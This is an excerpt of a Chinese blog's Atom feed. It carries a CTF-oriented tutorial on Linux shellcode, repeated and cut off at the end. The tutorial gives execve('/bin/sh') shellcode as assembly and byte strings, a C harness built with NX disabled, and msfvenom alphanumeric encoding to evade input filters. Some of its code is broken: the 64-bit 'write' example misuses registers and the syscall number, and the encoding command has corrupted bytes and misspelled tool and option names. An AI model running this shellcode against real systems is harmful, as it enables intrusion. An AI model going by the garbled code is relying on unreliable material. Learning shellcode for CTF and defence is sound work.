class="line">_start:</span><br></pre></td></tr></table></figure><p>这里定义了<code>_start</code>符号，汇编器在翻译汇编程序时会计算每个数据对象和每条指令的地址，当看到这样一个符号定义时，就<strong>把它后面一条指令的地址作为这个符号所代表的地址</strong>。而<code>_start</code>这个符号又比较特殊，它所<strong>代表的地址是整个程序的入口地址</strong>，所以下一条指令<code>movl $1, %rdi</code>就成了程序中第一条被执行的指令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作者：Reesun&lt;br&gt;
链接：&lt;a href=&quot;http://blog.chinaunix.net/uid-20548989-id-1667484.html&quot;&gt;http://blog.chinaunix.net/uid-20548989-id-1667484.html&lt;</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux汇编伪指令" scheme="https://www.rgzzplus.com/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Linux—shellcode开发入门</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux%E2%80%94shellcode%E5%BC%80%E5%8F%91/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux%E2%80%94shellcode%E5%BC%80%E5%8F%91/</id>
    <published>2022-08-05T12:48:42.000Z</published>
    <updated>2022-08-08T14:41:39.173Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-什么是-shellcode"><a class="markdownIt-Anchor" href="#1-什么是-shellcode"></a> 1. 什么是 shellcode ？</h1><p>shellcode 通常用机器语言编写，是一段用于软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行 shell 而得名。随着发展，shellcode 现在代表将插入到漏洞利用程序中以完成所需任务的任何字节码。</p><h1 id="2-shellcode-原理"><a class="markdownIt-Anchor" href="#2-shellcode-原理"></a> 2. shellcode 原理</h1><h2 id="21-理解系统调用"><a class="markdownIt-Anchor" href="#21-理解系统调用"></a> 2.1 理解系统调用</h2><p>shellcode 通常是一段能够执行某些系统调用的代码，所以直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可。</p><p>Linux 操作系统（2.6及更早的内核版本），通常用 <code>int $0x80软中断 + 系统调用号</code>（保存到eax中）来实现系统调用，其<mark>参数传递顺序依次为 ebx、ecx、edx、esi和edi</mark>，返回值存放在eax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">int $0x80</span><br><span class="line"></span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure><p>编译执行（可编译成 64 位程序）：<mark>用gcc编译，生成目标文件，用ld来链接</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c hello32.S</span><br><span class="line">$ ld -m elf_i386 -o hello32 hello32.o</span><br><span class="line">$ strace ./hello32                                                                   127 ⨯</span><br><span class="line">execve(<span class="string">&quot;./hello32&quot;</span>, [<span class="string">&quot;./hello32&quot;</span>], 0x7ffd941ae900 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3197 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;hello 32-bit!\n&quot;</span>, 14hello 32-bit!</span><br><span class="line">)         = 14</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>虽然软中断 int 0x80 非常经典，但是由于其性能较差，<strong>在往后的内核中被快速调用指令代替，32 位系统使用 sysenter(对应 sysexit)指令，64 位系统则使用 syscall（对应 sysret）指令。</strong></p><h2 id="22-调用约定"><a class="markdownIt-Anchor" href="#22-调用约定"></a> 2.2 调用约定</h2><p>调用约定是对函数调用时如何传递参数的一种约定。</p><p>（1）内核接口</p><ul><li>x86-32 系统调用约定：Linux系统调用使用寄存器传递参数。<mark>eax 存放系统调用号（syscall_number），ebx、ecx、edx、esi 和 ebp 用于将6个参数传递给系统调用</mark>。返回值保存在 eax 中。所有其它寄存器（包括 EFLAGS）都保存在 int 0x80 中。</li><li>x86-64 系统调用约定：系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。==rax 存放系统调用号（syscall_namber）。内核接口使用的寄存器有 rdi、rsi、rdx、r10、r8 和 r9。==系统调用通过 syscall 指令完成。除了 rcx、r11 和 eax，其它寄存器都被保留。返回值保存在 rax 中，只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。、</li></ul><p>（2）用户接口</p><ul><li>x86-32 函数调用约定：<mark>参数通过栈进行传递</mark>。最后一个参数第一个被放入栈中，知道所有的参数都放置完毕，然后执行 call 指令。</li><li>x86-64 函数调用约定：<mark>x86-64 下通过寄存器传递参数</mark>，这样做比栈更有效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数类型是 <mark>MEMORY</mark>，则在<mark>栈上传递参数</mark>。如果类型是 <mark>INTEGER</mark>，则==顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。==如果多于 6 个参数，则后面的参数将在栈中传递。</li></ul><h3 id="22-32位程序使用-sysenter-的例子"><a class="markdownIt-Anchor" href="#22-32位程序使用-sysenter-的例子"></a> 2.2 *32位程序使用 sysenter 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;Hello sysenter!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text </span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br><span class="line"></span><br><span class="line">sysenter_ret:</span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 sysenter 指令，需要<strong>手动为其布置栈</strong>。这是因为 sysenter 返回时，会执行 _kernel_vsyscall 的后半部分（从 0xf7fd5059 开始）。_kernel_vsyscall 封装了 sysenter 调用的规范，是 vDSO 的一部分，而 vDSO 运行程序在用户层中执行代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disasseble __kernel_vsyscall</span><br><span class="line">0xf7fd5050 &lt;+0&gt;:push ecx</span><br><span class="line">0xf7fd5051 &lt;+1&gt;:push edx</span><br><span class="line">0xf7fd5052 &lt;+2&gt;:push ebp</span><br><span class="line">0xf7fd5053 &lt;+3&gt;:movebp,esp</span><br><span class="line">0xf7fd5055 &lt;+5&gt;:sysenter</span><br><span class="line">0xf7fd5057 &lt;+7&gt;:int 0x80</span><br><span class="line">--&gt;0xf7fd5059 &lt;+9&gt;:popebp</span><br><span class="line">0xf7fd505a &lt;+10&gt;:popedx</span><br><span class="line">0xf7fd505b &lt;+11&gt;:pop ecx</span><br><span class="line">0xf7fd505c &lt;+12&gt;:ret</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 64 位程序）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c sysenter32.S</span><br><span class="line">$ ld -m elf_i386 -o sysenter sysenter32.o</span><br><span class="line">$ strace ./sysenter</span><br><span class="line">execve(<span class="string">&quot;./sysenter&quot;</span>, [<span class="string">&quot;./sysenter&quot;</span>], 0x7ffe74dda6e0 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3638 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;Hello sysenter!\n&quot;</span>, 16Hello sysenter!</span><br><span class="line">)       = 16</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h3 id="23-64位程序使用-syscall-的例子"><a class="markdownIt-Anchor" href="#23-64位程序使用-syscall-的例子"></a> 2.3 *64位程序使用 syscall 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 32 位程序）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -c hello64.S</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -o hello64 hello64.o</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">strace ./hello64</span> </span><br><span class="line">execve(&quot;./hello64&quot;, [&quot;./hello64&quot;], 0x7fffe7d694a0 /* 61 vars */) = 0</span><br><span class="line">write(1, &quot;hello 64-bit!\n&quot;, 14hello 64-bit!</span><br><span class="line">)         = 14</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h1 id="3-编写简单-shellcode"><a class="markdownIt-Anchor" href="#3-编写简单-shellcode"></a> 3. 编写简单 shellcode</h1><p>shellcode 只是一段代码，为了运行和验证，我们通常用<strong>函数指针</strong>或者<strong>内联函数</strong>的方式把它嵌入到C程序中来调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//污染所有寄存器，确保shellcode 在任何环境下都能运行</span></span><br><span class="line">    <span class="comment">/* __asm__(</span></span><br><span class="line"><span class="comment">    &quot;mov %eax, %ebx\n\t&quot;</span></span><br><span class="line"><span class="comment">&quot;mov %eax, %ecx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %esi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %ebp\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;call shellcode&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <a href="http://www.shell-storm.org/shellcode/">shell-storm</a>找一些 shellcode 学习案例，先看一个实现 execve(&quot;/bin/sh&quot;) 的 Linux 32位的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">; int execve(const char *filename, char *const argv[], char *const envp[])</span><br><span class="line"></span><br><span class="line">xorecx, ecx; ecx = NULL</span><br><span class="line">mulecx; eax and edx = NULL</span><br><span class="line">moval, 11; execve syscall</span><br><span class="line">pushecx; string NULL</span><br><span class="line">push0x68732f2f; &quot;//sh&quot;</span><br><span class="line">push0x6e69622f; &quot;/bin&quot;</span><br><span class="line">movebx, esp; pointer to &quot;/bin/sh\0&quot; string</span><br><span class="line">int0x80; bingo</span><br></pre></td></tr></table></figure><p>首先用 NASM 对这段汇编代码进行编译，然后使用 ld 链接，运行后获得shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf32 tiny_execve_sh.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d tiny_execve_sh           \                                               127 ⨯</span></span><br><span class="line"></span><br><span class="line">tiny_execve_sh：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line">08049000 &lt;_start&gt;:</span><br><span class="line"> 8049000:       31 c9                   xor    %ecx,%ecx</span><br><span class="line"> 8049002:       f7 e1                   mul    %ecx</span><br><span class="line"> 8049004:       b0 0b                   mov    $0xb,%al</span><br><span class="line"> 8049006:       51                      push   %ecx</span><br><span class="line"> 8049007:       68 2f 2f 73 68          push   $0x68732f2f</span><br><span class="line"> 804900c:       68 2f 62 69 6e          push   $0x6e69622f</span><br><span class="line"> 8049011:       89 e3                   mov    %esp,%ebx</span><br><span class="line"> 8049013:       cd 80                   int    $0x80</span><br></pre></td></tr></table></figure><p>为了在 C 程序中使用这段 shellcode，我们需将其 <mark>opcode 提取</mark>出来（我这里 cut:无效的字段范围）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d ./tiny_execve_sh|grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span></span><br><span class="line">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br></pre></td></tr></table></figure><p>将提取出来的字符放到 C 程序的 shellcode[] 中。需要注意的是，shellcode 作为全局初始化变量，存放在 .data 段中，而编译时默认开启的 NX 保护机制，会将数据所在的内存页标识为不可执行，当程序转入 shellcode 执行时抛出异常。因此，下面需要关闭 NX。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -m32 -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh_shellcode</span></span><br></pre></td></tr></table></figure><p>Linux 64 位的 shellcode 也一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 tiny_execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 tiny_execve_sh64.o -o tiny_execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh64</span> </span><br></pre></td></tr></table></figure><h1 id="4-shellcode-变形"><a class="markdownIt-Anchor" href="#4-shellcode-变形"></a> 4. shellcode 变形</h1><p>有时，被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等可见字符、ASCII 和 Unicode 编码转换等，因此需要进行一些处理。</p><p>由于 NULL 会将字符串操作函数截断，所以我们需要用其它相似功能的指令来替代，下面是一个 32 位指令替换的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">替换前：</span><br><span class="line">B8 01000000 MOVEAX,1</span><br><span class="line"></span><br><span class="line">替换后：</span><br><span class="line">33C0XOR EAX,EAX</span><br><span class="line">40INC EAX</span><br></pre></td></tr></table></figure><p>对于只能使用可见字符字母（也就是只能用字母和数字组合）的情况，将 shellcode 的字符进行编码，使其符合限制条件。相应地，需要在 shellcode 中加入解码器，在代码行前将原始 shellcode 还原出来。</p><p>著名的渗透测试框架 Metasploit 中就集成了许多 shellcode 的编码器，这里我们选择 x86/alpha_mixed 来编码 32 位的 shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">msfvenom -1 encoders | grep -i alphanumeric</span></span><br><span class="line">x86/alpha_mixed lowAlpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">x86/alpha_upperlowAlpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">x86/unicode_mixedmanual Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">x86/unicode uDpermanual Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xel\xb0\x0b\x51\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">x68\:&lt;2f\x2f\xT?3\x68\x68\x2f\x62\x69\x6e\x89\xo3\xcd\x80&quot;)&#x27;</span> | msfveno -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufterRegister=EAX</span> </span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed </span><br><span class="line">x86/alpha_mixed succeeded with size 96 (iteration=0)</span><br><span class="line">x86/alpha mixed chosen with final size 96</span><br><span class="line">Payload size: 96 bytes</span><br><span class="line">PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9igHah04Ksa3XTodot31</span><br><span class="line">xBHtorBcYpnniis8MOpAA</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/lsgxeva/p/10794331.html">Linux下shellcode的编写</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/212610634">带你玩转 Linux Shellcode</a></p><p>​<a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a></p><p>​<a href="https://cloud.tencent.com/developer/article/1930058?from=article.detail.1799682">Linux下Shellcode编写</a></p><p>​<a href="https://filippo.io/linux-syscall-table/">Linux Syscall Table</a></p><p>​《CTF竞赛权威指南》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-什么是-shellcode&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是-shellcode&quot;&gt;&lt;/a&gt; 1. 什么是 shellcode ？&lt;/h1&gt;
&lt;p&gt;shellcode 通常用机器语言</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Linux—shellcode开发入门</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</id>
    <published>2022-08-05T12:48:42.000Z</published>
    <updated>2022-08-08T14:40:18.770Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-什么是-shellcode"><a class="markdownIt-Anchor" href="#1-什么是-shellcode"></a> 1. 什么是 shellcode ？</h1><p>shellcode 通常用机器语言编写，是一段用于软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行 shell 而得名。随着发展，shellcode 现在代表将插入到漏洞利用程序中以完成所需任务的任何字节码。</p><h1 id="2-shellcode-原理"><a class="markdownIt-Anchor" href="#2-shellcode-原理"></a> 2. shellcode 原理</h1><h2 id="21-理解系统调用"><a class="markdownIt-Anchor" href="#21-理解系统调用"></a> 2.1 理解系统调用</h2><p>shellcode 通常是一段能够执行某些系统调用的代码，所以直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可。</p><p>Linux 操作系统（2.6及更早的内核版本），通常用 <code>int $0x80软中断 + 系统调用号</code>（保存到eax中）来实现系统调用，其<mark>参数传递顺序依次为 ebx、ecx、edx、esi和edi</mark>，返回值存放在eax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">int $0x80</span><br><span class="line"></span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure><p>编译执行（可编译成 64 位程序）：<mark>用gcc编译，生成目标文件，用ld来链接</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c hello32.S</span><br><span class="line">$ ld -m elf_i386 -o hello32 hello32.o</span><br><span class="line">$ strace ./hello32                                                                   127 ⨯</span><br><span class="line">execve(<span class="string">&quot;./hello32&quot;</span>, [<span class="string">&quot;./hello32&quot;</span>], 0x7ffd941ae900 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3197 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;hello 32-bit!\n&quot;</span>, 14hello 32-bit!</span><br><span class="line">)         = 14</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>虽然软中断 int 0x80 非常经典，但是由于其性能较差，<strong>在往后的内核中被快速调用指令代替，32 位系统使用 sysenter(对应 